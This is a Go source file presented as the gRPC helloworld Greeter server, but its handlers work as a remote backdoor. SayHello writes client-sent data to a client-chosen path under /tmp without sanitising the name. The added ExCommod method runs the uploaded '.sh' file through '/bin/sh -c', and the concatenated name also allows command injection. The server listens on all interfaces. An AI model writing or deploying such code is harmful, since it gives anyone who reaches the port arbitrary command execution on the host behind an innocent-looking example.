/*
 *
 * Copyright 2015 gRPC authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

// Package main implements a server for Greeter service.
package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	pb "new/helloworld/helloworld"
	"os/exec"
	"path"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

var (
	port = flag.Int("port", 50052, "The server port")
)

// server is used to implement helloworld.GreeterServer.
type server struct {
	pb.UnimplementedGreeterServer
}

// SayHello implements helloworld.GreeterServer
func (s *server) SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {
	log.Printf("Received: %v", in.GetName())
	err := ioutil.WriteFile("/tmp/"+in.GetName(), in.GetData(), 0655)
	if err != nil {
		log.Fatal(err)
	}

	return &pb.HelloReply{Message: "send " + in.GetName()}, nil
}

func (s *server) ExCommod(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, error) {
	if path.Ext(in.Name) == ".sh" {
		command := exec.Command("/bin/sh", "-c", "/tmp/"+in.GetName())
		err := command.Start()
		if err != nil {
			log.Printf(err.Error())
		}
	}
	return &pb.HelloReply{Message: "Excomd:" + in.GetName()}, nil
}

func main() {
	flag.Parse()
	lis, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", *port))
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}

	creds, err := credentials.NewServerTLSFromFile("x509/server_cert.pem", "x509/server_key.pem")
	if err != nil {
		log.Fatalf("failed to create credentials: %v", err)
	}

	// Create an array of gRPC options with the credentials

	s := grpc.NewServer(grpc.Creds(creds))
	pb.RegisterGreeterServer(s, &server{})
	log.Printf("server listening at %v", lis.Addr())
	if err := s.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
	}
}
